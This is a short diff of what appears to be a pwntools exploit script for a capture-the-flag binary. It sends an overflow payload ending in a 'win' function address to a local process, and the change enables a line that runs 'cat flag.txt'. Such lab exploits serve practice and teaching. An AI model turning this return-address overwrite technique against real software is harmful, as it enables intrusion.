@@ -17,5 +17,5 @@ win = p64(analyzer.get_win())
 io = process(binary)
 io.sendline(buf + win)
 
-#io.sendline(b'cat flag.txt')
+io.sendline(b'cat flag.txt')
 io.interactive()
